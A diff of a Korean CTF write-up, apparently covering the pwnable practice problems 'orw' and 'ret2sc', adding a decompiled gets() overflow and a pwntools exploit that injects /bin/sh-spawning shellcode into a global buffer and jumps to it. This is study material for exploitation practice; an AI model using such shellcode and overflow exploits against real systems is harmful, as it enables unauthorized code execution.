@@ -98,8 +98,6 @@ Give my your shellcode:
 ~~~
 위는 dissasemble main의 결과이다. 
 ~~~python
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
 from pwn import *
 r=process("orw.bin")
 pay=""
@@ -111,3 +109,39 @@ r.sendline(pay)
 r.interactive()
 ~~~
 flag.txt에 flag가 들어있을 것을 가정했다.(정보가 없어서 다른 wirteup을 참고했다). shellcraft.open에서는 flag.txt에서 flag를 가져온다고 가정하였다. eax에서 받은 100byte 즉 flag 부분을 esp에 저장시킨 후 다시 100byte만큼 write하도록 payload를 작성했다. 문제의 원형태를 몰라 writeup를 참고했으나 이 역시 어려운 문제는 아닌 듯하다. 
+## ret2sc
+문제를 보고 조금 반가웠던 건 전형적인 bof 문제여서다. 딱봐도 name에다가 shellcode 넣어두고 gets에서 실행하라는 식으로 짜놓은 것을 ida를 통해 확인했다.
+~~~c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s; // [esp+1Ch] [ebp-14h]
+
+  setvbuf(stdout, 0, 2, 0);
+  printf("Name:");
+  read(0, &name, 0x32u);
+  printf("Try your best:");
+  return (int)gets(&s);
+}
+~~~
+name의 주소는 0x804A060 name 이였다.
+~~~python
+from pwn import *
+
+p=process('./ret2sc')
+ELF('./ret2sc')
+
+name=''
+name+="A"*10
+name+="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
+
+best=''
+best+="A"*32
+best+=p32(0x804a060)
+
+p.sendafter(':',name)
+
+p.sendafter(':',best)
+
+p.interactive()
+~~~
+위는 내가 짠 코드이다. 문제들이 전체적으로 무난하다.
